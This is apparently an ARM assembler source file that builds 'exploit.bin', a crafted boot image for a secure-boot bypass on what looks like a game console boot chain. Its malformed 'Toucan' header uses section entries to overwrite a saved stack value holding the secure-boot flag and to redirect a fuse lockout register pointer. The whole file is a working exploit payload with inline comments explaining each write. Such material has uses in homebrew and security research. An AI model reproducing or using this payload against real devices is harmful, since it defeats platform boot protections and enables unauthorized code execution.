.arm.big
.create "exploit.bin", 0
.incbin "sdboot1.ancast"
.align 0x80000
; Toucan image header
.word 0xfd9b5b7a ; magic
.word 2 ; section count
.word 0x01808000, 0x01808800 ; some space in Napa to clobber
.word 0 ; flags
.word 0 ; syscfg1 (unused as flag for that is unset)
.word 0, 0 ; unused
; Section headers
.word 0x0d40aa50 ; address of saved r6 (secure boot enabled) on stack
.word 4 ; size
.word 0x0d400af4 ; pointer to fuse lockout MMIO register
.word 4 ; size
.align 0x20
; Section data
.word 0 ; secure boot disabled
.align 0x20
.word 0x0d400000 ; point it to the boot1 ancast header
.align 0x10000
.close